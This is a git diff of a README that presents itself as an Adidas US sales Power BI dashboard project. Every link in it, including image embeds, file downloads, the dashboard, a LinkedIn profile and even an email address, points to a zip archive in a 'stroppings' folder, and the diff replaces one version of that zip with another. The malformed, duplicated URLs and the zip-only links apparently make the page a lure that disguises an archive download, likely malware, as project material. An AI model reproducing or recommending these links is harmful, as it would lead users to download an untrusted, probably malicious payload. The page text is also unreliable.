@@ -1,5 +1,5 @@
 # Adidas US Sales Analysis Power BI Project
-![](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20BI%20Background%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip)
+![](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Background%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
 ## Introduction
 This project was developed during my **Analytics Extra mentorship program** :㊗️, aimed at enhancing my data analytics and business intelligence skills. The focus was on creating a visually engaging and interactive dashboard to analyze Adidas US sales data. Leveraging Power BI, I incorporated advanced data modeling, data transformation, and report design techniques. 
 
@@ -45,7 +45,7 @@ The final data model was a star schema with the following relationships:
 - Dimension Tables: `Product`, `Location`, and a Date Table (created using DAX).
 - Relationships: One-to-Many relationships connecting the fact table to the dimension tables.
 
-![Data Model](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20BI%20Data%20Model%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip)
+![Data Model](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Data%20Model%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
 
 ---
 
@@ -55,25 +55,25 @@ The final data model was a star schema with the following relationships:
    - Overview of the dashboard with a slicer for region-based filtering.
    - Interactive map showing sales performance by state.
 
-![Home Page](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20BI%20Report%20Home%20Page%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip)
+![Home Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20Home%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
 
 ### **2. Product Page**
    - Dynamic visualizations of product-level performance.
    - A slicer for filtering products with an interactive display of product images.
 
-![Product Page](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20BI%20Report%20Product%20Page%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip)
+![Product Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20Product%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
 
 ### **3. Deep Insights Page**
    - Detailed analysis of profitability and sales trends.
    - Visualizations included bar charts, line graphs, and KPIs.
 
-![Deep Insights Page](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20BI%20Report%20Deep%20Insight%20Page%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip)
+![Deep Insights Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20Deep%20Insight%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
 
 ### **4. Tooltip Pages**
    - Contextual insights embedded within visuals.
    - Hover-over details for granular exploration.
 
-![Tooltip Page](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20BI%20Report%20State%20Tooltip%20Page%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip)
+![Tooltip Page](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Report%20State%20Tooltip%20Page%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
 
 ---
 
@@ -91,9 +91,9 @@ These insights enabled Adidas to focus on high-performing regions and optimize i
 The dashboard was deployed to Microsoft Fabric using the following stages:
 1. **Development Stage:** Initial version of the dashboard for internal testing.
 2. **Testing Stage:** Conducted user acceptance testing to validate performance.
-3. **Production Stage:** Published the final version for stakeholders and generated a public sharing link [here](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip).
+3. **Production Stage:** Published the final version for stakeholders and generated a public sharing link [here](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip).
 
-![Microsoft Fabric Deployment Pipeline](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20BI%20Fabric%20Deployment%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip)
+![Microsoft Fabric Deployment Pipeline](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20BI%20Fabric%20Deployment%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip)
 
 ---
 
@@ -110,13 +110,13 @@ This project demonstrated the power of interactive dashboards in providing actio
 ---
 
 ## Repository Contents
-1. **Power BI File:** [Download the .pbix file](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20Sales%20Data%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip).
-2. **Dataset:** [Download the Excel dataset](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip%20US%https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip).
+1. **Power BI File:** [Download the .pbix file](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20Sales%20Data%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip).
+2. **Dataset:** [Download the Excel dataset](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20US%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip).
 3. **Screenshots:** All visuals included in this report.
-4. **Public Dashboard Link:** [Access the published dashboard here](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip).
+4. **Public Dashboard Link:** [Access the published dashboard here](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip).
 
 ---
 
 ## Contact
 Feel free :😃 to connect with me on LinkedIn or explore my GitHub profile for more projects:
-- [LinkedIn Profile](https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip) or email https://raw.githubusercontent.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/main/stroppings/B_U_Sales_Adidas_Project_Power_Analysis_1.8.zip 
+- [LinkedIn Profile](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip) or email https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip 
